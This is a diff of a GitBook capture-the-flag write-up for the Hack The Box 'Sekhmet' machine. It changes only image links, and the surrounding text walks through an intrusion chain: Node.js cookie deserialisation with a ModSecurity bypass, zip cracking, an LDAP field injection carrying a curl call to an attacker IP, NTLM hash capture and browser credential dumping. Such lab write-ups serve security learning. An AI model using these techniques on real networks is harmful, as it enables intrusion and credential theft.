@@ -8,7 +8,7 @@ description: Took me a few weeks...really long and really convuluted.
 
 Nmap scan:
 
-![](<../../../.gitbook/assets/image%20(2193).png>)
+![](../../../.gitbook/assets/sekhmet-15.png)
 
 When trying to head to the webpage, we need to use the `www.windcorp.htb`domain.
 
@@ -16,15 +16,15 @@ When trying to head to the webpage, we need to use the `www.windcorp.htb`domain.
 
 The page displays a common corporate website:
 
-![](<../../../.gitbook/assets/image%20(821).png>)
+![](../../../.gitbook/assets/sekhmet-48.png)
 
 Looking through the web page, we can take note of some names which might be important:
 
-![](<../../../.gitbook/assets/image%20(3944).png>)
+![](../../../.gitbook/assets/sekhmet-42.png)
 
 This website might have other subdomains, so I began fuzzing with `gobuster` and `wfuzz`. Found one at `portal.windcorp.htb`.
 
-![](<../../../.gitbook/assets/image%20(155).png>)
+![](../../../.gitbook/assets/sekhmet-7.png)
 
 We can add that to the `/etc/hosts` file and enumerate there.
 
@@ -32,11 +32,11 @@ We can add that to the `/etc/hosts` file and enumerate there.
 
 At the new domain, we are greeted by a login page.
 
-![](<../../../.gitbook/assets/image%20(2755).png>)
+![](../../../.gitbook/assets/sekhmet-22.png)
 
 I attempted to login with `admin:admin`, and it worked!
 
-![](<../../../.gitbook/assets/image%20(2454).png>)
+![](../../../.gitbook/assets/sekhmet-18.png)
 
 When proxying the traffic, we can view an interesting cookie.
 
@@ -56,7 +56,7 @@ If-None-Match: W/"56c-p/i7GTqmqUq+k/bjnk4SFBcSAkI"
 
 The `profile` cookie looked like a JWT token, but it was not.
 
-![](<../../../.gitbook/assets/image%20(3795).png>)
+![](../../../.gitbook/assets/sekhmet-38.png)
 
 Also, the website was **powered by Express,** which might be useful in determining possible exploits regarding these cookies.
 
@@ -64,7 +64,7 @@ Also, the website was **powered by Express,** which might be useful in determini
 
 When trying to fuzz the login page with some SQL Injection payloads, I got this error.
 
-![](<../../../.gitbook/assets/image%20(1787).png>)
+![](../../../.gitbook/assets/sekhmet-10.png)
 
 It seems that ModSec is the WAF used to protect this webpage. Odd that they would include this. Research on some cookie related exploits for Mod Security revealed a few good articles.
 
@@ -72,11 +72,11 @@ It seems that ModSec is the WAF used to protect this webpage. Odd that they woul
 
 This article states how there's a DoS condition possible with Mod Security through the use of a second `=` sign within the cookie parameter.
 
-![](<../../../.gitbook/assets/image%20(1455).png>)
+![](../../../.gitbook/assets/sekhmet-6.png)
 
 The PoC also states that it's possible to inject payloads through this.
 
-![](<../../../.gitbook/assets/image%20(2110).png>)
+![](../../../.gitbook/assets/sekhmet-11.png)
 
 So with this website, so far we know that this is running an Express framework, and the cookie is the point of injection. Doing research on cookie and Express related vulnerabilities led me to this article:
 
@@ -86,7 +86,7 @@ There might be a deserialisation exploit with the cookies here, and ModSec was t
 
 We can follow the tutorial exactly to create the payload. First we can generate the shell using `nodejsshell.py` provided by the article and use base64 to encode it.
 
-![](<../../../.gitbook/assets/image%20(711).png>)
+![](../../../.gitbook/assets/sekhmet-46.png)
 
 Then, we would need to append something at the back of the cookie **to make sure we bypass ModSec and let the cookie pass through**. This would allow for the RCE to work. This was the final request sent via Burpsuite:
 
@@ -107,7 +107,7 @@ If-None-Match: W/"570-pCEHA1bFjNPlboV91WiNzCFs0wY"
 
 I managed to retrieve a shell using this method as a `webster` user after sending this request.
 
-![](<../../../.gitbook/assets/image%20(2351).png>)
+![](../../../.gitbook/assets/sekhmet-16.png)
 
 ## Webserver Foothold
 
@@ -117,15 +117,15 @@ This machine was supposed to be a Windows machine, but I ended up within a Linux
 
 Anyways, when viewing the home directory, we see this backup.zip file:
 
-![](<../../../.gitbook/assets/image%20(4003).png>)
+![](../../../.gitbook/assets/sekhmet-43.png)
 
 When trying to unzip it, we can see that it is password protected and that the `/etc/passwd` file si within it. There are also a ton of other files related to Active Directory, such as GPOs and Kerberos configurations.
 
-![](<../../../.gitbook/assets/image%20(388).png>)
+![](../../../.gitbook/assets/sekhmet-41.png)
 
 I found it incredibly odd that there was a random zip file here. Trying to crack the hash didn't work for me as well. Transferring the file back to my machine, we can use `7z l -slt` to view the technical information of the zip file.
 
-![](<../../../.gitbook/assets/image%20(1647).png>)
+![](../../../.gitbook/assets/sekhmet-8.png)
 
 This was using ZipCrypto Deflate, meaning that the `bkcrack` exploit would work on this due to the legacy encryption used.
 
@@ -145,7 +145,7 @@ zip passwd.zip passwd
 
 This should create a new zip file that we can open easily.
 
-![](<../../../.gitbook/assets/image%20(350).png>)
+![](../../../.gitbook/assets/sekhmet-34.png)
 
 Now, we can take a proper look at the files within this zip folder.
 
@@ -155,39 +155,39 @@ Within the zip file, there were tons of configuration files to look through. Nat
 
 Within it, there were some ldb files.
 
-![](<../../../.gitbook/assets/image%20(2728).png>)
+![](../../../.gitbook/assets/sekhmet-21.png)
 
 Within the cache\_windcorp.htb.ldb file, I found a credential after using `strings` on it. The user was `ray.duncan`.
 
-![](<../../../.gitbook/assets/image%20(3274).png>)
+![](../../../.gitbook/assets/sekhmet-29.png)
 
 And he has a hashed password within this folder.
 
-![](<../../../.gitbook/assets/image%20(3275).png>)
+![](../../../.gitbook/assets/sekhmet-30.png)
 
 This hash can be cracked easily:
 
-![](<../../../.gitbook/assets/image%20(2174).png>)
+![](../../../.gitbook/assets/sekhmet-14.png)
 
 So now we have SOME credentails. Doing further enumeration on the files reveals that there are other networks present on this machine.
 
-![](<../../../.gitbook/assets/image%20(2129).png>)
+![](../../../.gitbook/assets/sekhmet-12.png)
 
 So 192.168.0.2 had the KDC (and hence DC) of this machine. Within the other db files, there was mention of a `hope.windcorp.htb` domain.
 
-![](<../../../.gitbook/assets/image%20(793).png>)
+![](../../../.gitbook/assets/sekhmet-47.png)
 
 ### Ray.Duncan
 
 Within the machine, we can attempt to SSH in as ray.duncan@windcorp.htb (yes that's his user).
 
-![](<../../../.gitbook/assets/image%20(2967).png>)
+![](../../../.gitbook/assets/sekhmet-27.png)
 
 Now, we are on the same webserver host with persistence this time. Because of all of the Kerberos stuff and confirmation that this is an AD-related machine, we can request and cache a ticket via `kinit`. Searching on how to use a ticket in Linux led me to `ksu`, which basically is `su` with Kerberos.
 
 With these commands, we can become root on this machine and capture the user flag.
 
-![](<../../../.gitbook/assets/image%20(2363).png>)
+![](../../../.gitbook/assets/sekhmet-17.png)
 
 ## Active Directory
 
@@ -201,7 +201,7 @@ for p in {1..65535}; do nc -vn 192.168.0.2 $p -w 1 -z & done 2> output.txt
 
 From here, we can see some ports that are open.
 
-![](<../../../.gitbook/assets/image%20(1114).png>)
+![](../../../.gitbook/assets/sekhmet-2.png)
 
 This pretty much confirms that the actual DC is at 192.168.0.2. We would need to use chisel and proxychains to direct traffic there for further enumeration.
 
@@ -215,7 +215,7 @@ This pretty much confirms that the actual DC is at 192.168.0.2. We would need to
 
 Afterwards, we can reach the DC just fine.
 
-![](<../../../.gitbook/assets/image%20(1186).png>)
+![](../../../.gitbook/assets/sekhmet-3.png)
 
 Now we can start with some proper enumeration of the domain. The first thing I noted was that port 53 for DNS was open within the output. We can use dig top find out
 
@@ -223,19 +223,19 @@ Now we can start with some proper enumeration of the domain. The first thing I n
 
 With the credentials for ray.duncan, we can actually request a ticket for him. This can be done using `getST.py`.
 
-![](<../../../.gitbook/assets/image%20(2534).png>)
+![](../../../.gitbook/assets/sekhmet-19.png)
 
 WIth this ticket, we can check out the shares within the domain, since SMB was open on the host.
 
-![](<../../../.gitbook/assets/image%20(3806).png>)
+![](../../../.gitbook/assets/sekhmet-39.png)
 
 WC-Share was something new.
 
-![](<../../../.gitbook/assets/image%20(2983).png>)
+![](../../../.gitbook/assets/sekhmet-28.png)
 
 Within this .txt file, we find an interesting output.
 
-![](<../../../.gitbook/assets/image%20(1298).png>)
+![](../../../.gitbook/assets/sekhmet-4.png)
 
 I wasn't sure what to do with this, but we can keep it for now I guess.
 
@@ -243,11 +243,11 @@ I wasn't sure what to do with this, but we can keep it for now I guess.
 
 SMB revealed nothing of interest, so I moved onto LDAP enumeration. I dumped information using `ldapsearch`. This was done on the container using the ticket we cached for ray.duncan earlier with `kinit`.
 
-![](<../../../.gitbook/assets/image%20(1393).png>)
+![](../../../.gitbook/assets/sekhmet-5.png)
 
 Analysing the information, we notice that the numbers and users and numbers we found earlier on the shares are present in the `mobile` field for users.
 
-![](<../../../.gitbook/assets/image%20(3845).png>)
+![](../../../.gitbook/assets/sekhmet-40.png)
 
 I was wondering what this parameter was used for, and why was it hinted at. The first thing that comes to mind is testing for RCE or other injection payloads. To modify LDAP entries, we would need to use `ldapmodify`. This also involves the creation of LDIF files.
 
@@ -262,9 +262,9 @@ replace: mobile
 mobile: 1;curl http://10.10.14.29/rcecfmed
 ```
 
-![](<../../../.gitbook/assets/image%20(3393).png>)
+![](../../../.gitbook/assets/sekhmet-32.png)
 
-![](<../../../.gitbook/assets/image%20(532).png>)
+![](../../../.gitbook/assets/sekhmet-45.png)
 
 This confirms we have RCE. Now, we can attempt to gain a reverse shell on the machine. I tried downloading nc.exe on the machine, and noticed that there was a character limit on the mobile entry. Anyways, downloading the file to `C:\Windows\Tasks\` works, but it does not seem to execute to give me my shell.
 
@@ -296,7 +296,7 @@ We can change the commands executed within the `program.cs` file to what we want
 
 Eventually, you'll get a shell.
 
-![](<../../../.gitbook/assets/image%20(1093).png>)
+![](../../../.gitbook/assets/sekhmet-1.png)
 
 The shell is a bit buggy if we leave the LDAP entry that is executing the payload to continue running, so I changed it back to numbers after getting the shell to prevent this from happening.
 
@@ -306,11 +306,11 @@ The shell is a bit buggy if we leave the LDAP entry that is executing the payloa
 
 As this new user, I enumerated around a bit. Found another user on the host named Bob.Wood.
 
-![](<../../../.gitbook/assets/image%20(3756).png>)
+![](../../../.gitbook/assets/sekhmet-37.png)
 
 We also find out the Domain Admins:
 
-![](<../../../.gitbook/assets/image%20(450).png>)
+![](../../../.gitbook/assets/sekhmet-44.png)
 
 Seems that bob.wood is both a user and an admin. Perhaps, he is using the same device to switch between user and administrator accounts. We'll keep this in mind for later.
 
@@ -318,7 +318,7 @@ I ran WinPEAS within the machine in the `C:\Windows\Debug\wia` directory to bypa
 
 We can check to see that the NTLM settings are insecure:
 
-![](<../../../.gitbook/assets/image%20(2920).png>)
+![](../../../.gitbook/assets/sekhmet-26.png)
 
 NTLMv2 is the legacy protocol that uses the challenge-response method of authenticating users, and **this involves sending the user hash**. This means that the next step is to intercept this response and capture the hash.
 
@@ -328,7 +328,7 @@ For some reason, it wouldn't let me authenticate to my own SMB server from the D
 
 First, we can find out the webserver's domain name:
 
-![](<../../../.gitbook/assets/image%20(3503).png>)
+![](../../../.gitbook/assets/sekhmet-35.png)
 
 Then, we can simply use a `smbserver` binary from here.
 
@@ -344,21 +344,21 @@ Here's the output of that:
 net use \\webserver.windcorp.htb\share
 </code></pre>
 
-![](<../../../.gitbook/assets/image%20(3446).png>)
+![](../../../.gitbook/assets/sekhmet-33.png)
 
 We can then crack this hash using `john`.
 
-![](<../../../.gitbook/assets/image%20(2830).png>)
+![](../../../.gitbook/assets/sekhmet-24.png)
 
 ### Bob.Wood
 
 Now that we have one set of credentials, we can think about how to gain a shell on bob.wood. I tried remote Powershell with the credentials, and found that they were re-used!
 
-![](<../../../.gitbook/assets/image%20(3581).png>)
+![](../../../.gitbook/assets/sekhmet-36.png)
 
 With this, we can gain another shell on the host using the same binary that bypassed AppLocker and AMSI.
 
-![](<../../../.gitbook/assets/image%20(2172).png>)
+![](../../../.gitbook/assets/sekhmet-13.png)
 
 ### Bob.Woodadm
 
@@ -368,7 +368,7 @@ I could not run winPEAS for some reason, always crashed my shell. So I manually 
 
 There was mention of the bob.woodADM user here.
 
-![](<../../../.gitbook/assets/image%20(1780).png>)
+![](../../../.gitbook/assets/sekhmet-9.png)
 
 I went to search for Github Repos with tools that could decrypt this thing, and eventually found one here:
 
@@ -376,16 +376,16 @@ I went to search for Github Repos with tools that could decrypt this thing, and 
 
 This tool would help us decrypt the data we need. We can download this to the machine. We can run this thing, and see that it successfully dumps out data from the browser.
 
-![](<../../../.gitbook/assets/image%20(3285).png>)
+![](../../../.gitbook/assets/sekhmet-31.png)
 
 And we can find the credentials for bob.woodadm.
 
-![](<../../../.gitbook/assets/image%20(2842).png>)
+![](../../../.gitbook/assets/sekhmet-25.png)
 
 Now, we can attempt some remote Powershell again.
 
-![](<../../../.gitbook/assets/image%20(2828).png>)
+![](../../../.gitbook/assets/sekhmet-23.png)
 
-![](<../../../.gitbook/assets/image%20(2661).png>)
+![](../../../.gitbook/assets/sekhmet-20.png)
 
 Then, we can finally capture this flag and end the box. This machine took about 2 weeks to finish because all the steps were pretty hard to spot...
